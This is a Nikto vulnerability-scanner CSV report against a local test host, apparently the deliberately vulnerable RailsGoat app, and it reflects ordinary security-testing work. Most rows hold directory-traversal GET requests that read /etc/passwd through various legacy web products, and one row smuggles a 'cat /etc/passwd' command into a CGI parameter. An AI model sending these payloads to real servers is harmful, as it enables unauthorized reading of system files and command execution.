"Nikto - v2.1.6/2.1.5"
"192.168.1.142","192.168.1.142","3000","","","",""
"192.168.1.142","192.168.1.142","3000","OSVDB-0","GET","/","Cookie _railsgoat_session created without the httponly flag"
"192.168.1.142","192.168.1.142","3000","OSVDB-0","GET","/","Uncommon header 'x-runtime' found, with contents: 0.135478"
"192.168.1.142","192.168.1.142","3000","OSVDB-0","GET","/","Uncommon header 'x-request-id' found, with contents: 99f5d33d-8c32-4656-84eb-e5ab755be532"
"192.168.1.142","192.168.1.142","3000","OSVDB-0","GET","/trace.axd","The .NET IIS server has application tracing enabled. This could allow an attacker to view the last 50 web requests."
"192.168.1.142","192.168.1.142","3000","OSVDB-2400","GET","/admin-serv/tasks/configuration/ViewLog?file=passwd&num=5000&str=&directories=admin-serv%2Flogs%2f..%2f..%2f..%2f..%2f..%2f..%2fetc&id=admin-serv","iPlanet Administration Server 5.1 allows remote users to download any file from the server. Upgrade to SunOne DS5.2 and in iDS5.1 SP2 Hotfix 2."
"192.168.1.142","192.168.1.142","3000","OSVDB-0","GET","/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd","The Web_Server_4D is vulnerable to a directory traversal problem."
"192.168.1.142","192.168.1.142","3000","OSVDB-5553","GET","/netget?sid=user&msg=300&file=../../../../../../../../../../etc/passwd","Sybex E-Trainer allows arbitrary files to be retrieved."
"192.168.1.142","192.168.1.142","3000","OSVDB-0","GET","///etc/passwd","The server install allows reading of any system file by adding an extra '/' to the URL."
"192.168.1.142","192.168.1.142","3000","OSVDB-50624","GET","/albums/userpics/Copperminer.jpg.php?cat%20/etc/passwd","Coppermine 1.0 RC3 may have been compromised to allow arbitrary file retreival. Upgrade to the latest at http://www.chezgreg.net/coppermine/"
"192.168.1.142","192.168.1.142","3000","OSVDB-9028","GET","/autohtml.php?op=modload&mainfile=x&name=/etc/passwd","php-proxima 6.0 and below allows arbitrary files to be retrieved."
"192.168.1.142","192.168.1.142","3000","OSVDB-49354","GET","/atomicboard/index.php?location=../../../../../../../../../../etc/passwd","AtomicBoard v0.6.2 allows remote users to read arbitrary files."
"192.168.1.142","192.168.1.142","3000","OSVDB-54099","GET","/current/modules.php?mod=fm&file=../../../../../../../../../../etc/passwd%00&bn=fm_d1","w-agora 4.1.5 allows any file to be retrieved from the remote host."
"192.168.1.142","192.168.1.142","3000","OSVDB-3012","GET","/current/index.php?site=demos&bn=../../../../../../../../../../etc/passwd%00","w-agora 4.1.5 allows any file to be retrieved from the remote host."
"192.168.1.142","192.168.1.142","3000","OSVDB-54058","GET","/typo3/dev/translations.php?ONLY=%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd%00","TYPO3 allows any file to be retrieved remotely. Upgrade to the latest version."
"192.168.1.142","192.168.1.142","3000","OSVDB-54058","GET","/cms/typo3/dev/translations.php?ONLY=%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd%00","TYPO3 allows any file to be retrieved remotely. Upgrade to the latest version."
"192.168.1.142","192.168.1.142","3000","OSVDB-54058","GET","/site/typo3/dev/translations.php?ONLY=%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd%00","TYPO3 allows any file to be retrieved remotely. Upgrade to the latest version."
"192.168.1.142","192.168.1.142","3000","OSVDB-54058","GET","/typo/typo3/dev/translations.php?ONLY=%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd%00","TYPO3 allows any file to be retrieved remotely. Upgrade to the latest version."
"192.168.1.142","192.168.1.142","3000","OSVDB-54058","GET","/typo3/typo3/dev/translations.php?ONLY=%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd%00","TYPO3 allows any file to be retrieved remotely. Upgrade to the latest version."
"192.168.1.142","192.168.1.142","3000","OSVDB-0","GET","/DomainFiles/*//../../../../../../../../../../etc/passwd","Communigate Pro 4.0b to 4.0.2 allow any file to be retrieved from the remote system."
"192.168.1.142","192.168.1.142","3000","OSVDB-59600","GET","/ezhttpbench.php?AnalyseSite=/etc/passwd&NumLoops=1","eZ httpbench version 1.1 allows any file on the remote server to be retrieved."
"192.168.1.142","192.168.1.142","3000","OSVDB-2870","GET","/index.php?download=/etc/passwd","Snif 1.2.4 allows any file to be retrieved from the web server."
"192.168.1.142","192.168.1.142","3000","OSVDB-59085","GET","/index.php?|=../../../../../../../../../etc/passwd","Portix-PHP Portal allows retrieval of arbitrary files via the '..' type filtering problem."
"192.168.1.142","192.168.1.142","3000","OSVDB-0","GET","/index.php?page=../../../../../../../../../../etc/passwd","The PHP-Nuke Rocket add-in is vulnerable to file traversal, allowing an attacker to view any file on the host. (probably Rocket, but could be any index.php)"
"192.168.1.142","192.168.1.142","3000","OSVDB-59085","GET","/index.php?l=forum/view.php&topic=../../../../../../../../../etc/passwd","Portix-PHP Portal allows retrieval of arbitrary files via the '..' type filtering problem."
"192.168.1.142","192.168.1.142","3000","OSVDB-0","GET","/jsp/jspsamp/jspexamples/viewsource.jsp?source=../../../../../../../../../../etc/passwd","Default JRun CGI lets users read any system file."
"192.168.1.142","192.168.1.142","3000","OSVDB-51750","GET","/k/home?dir=/&file=../../../../../../../../etc/passwd&lang=kor","Kebi Academy 2001 Web Solution allows any file to be retrieved from the remote system."
"192.168.1.142","192.168.1.142","3000","OSVDB-0","GET","/nph-showlogs.pl?files=../../../../../../../../etc/passwd&filter=.*&submit=Go&linecnt=500&refresh=0","nCUBE Server Manage 1.0 allows any file to be read on the remote system."
"192.168.1.142","192.168.1.142","3000","OSVDB-2829","GET","/phpwebfilemgr/index.php?f=../../../../../../../../../etc/passwd","phpWebFileManager v2.0.0 and prior are vulnerable to a directory traversal bug."
"192.168.1.142","192.168.1.142","3000","OSVDB-0","GET","/phptonuke.php?filnavn=/etc/passwd","Photonouke or myphpnuke allows arbitrary files to be retrieved from the remote host."
"192.168.1.142","192.168.1.142","3000","OSVDB-0","GET","/put/cgi-bin/putport.exe?SWAP&BOM&OP=none&Lang=en-US&PutHtml=../../../../../../../../etc/passwd","NCR's Terradata server contains a CGI that allows any file to be retrieved remotely."
"192.168.1.142","192.168.1.142","3000","OSVDB-521","GET","/ROADS/cgi-bin/search.pl?form=../../../../../../../../../../etc/passwd%00","The ROADS search.pl allows attackers to retrieve system files."
"192.168.1.142","192.168.1.142","3000","OSVDB-0","GET","/support/common.php?f=0&ForumLang=../../../../../../../../../../etc/passwd","This CGI allows attackers to read files on the host."
"192.168.1.142","192.168.1.142","3000","OSVDB-0","GET","/viewpage.php?file=/etc/passwd","PHP-Nuke script viewpage.php allows any file to be retrieved from the remote system."
"192.168.1.142","192.168.1.142","3000","OSVDB-431","GET","/Web_Store/web_store.cgi?page=../../../../../../../../../../etc/passwd%00.html","eXtropia's Web Store lets attackers read any file on the system by appending a %00.html to the name."
"192.168.1.142","192.168.1.142","3000","OSVDB-9055","GET","/webMathematica/MSP?MSPStoreID=../../../../../../../../../../etc/passwd&MSPStoreType=image/gif","Wolfram Research's webMathematica allows any file to be read on the remote system. Upgrade to the latest version on http://www.wolfram.com/"
"192.168.1.142","192.168.1.142","3000","OSVDB-17110","GET","/servlet/webacc?User.html=../../../../../../../../../../../../../../../../../../etc/passwd%00","The Novell Groupwise WebAcc Servlet allows attackers to view arbitrary files on the server."
"192.168.1.142","192.168.1.142","3000","OSVDB-0","GET","/webcalendar/forum.php?user_inc=../../../../../../../../../../etc/passwd","Webcalendar 0.9.41 and below allow remote users to read arbitrary files."
"192.168.1.142","192.168.1.142","3000","OSVDB-15392","GET","/logbook.pl?file=../../../../../../../bin/cat%20/etc/passwd%00|","Wordit Limited 2000 allows command execution."
"192.168.1.142","192.168.1.142","3000","OSVDB-59084","GET","/page.cgi?../../../../../../../../../../etc/passwd","WWWeBBB Forum up to version 3.82beta allow arbitrary file retrieval."
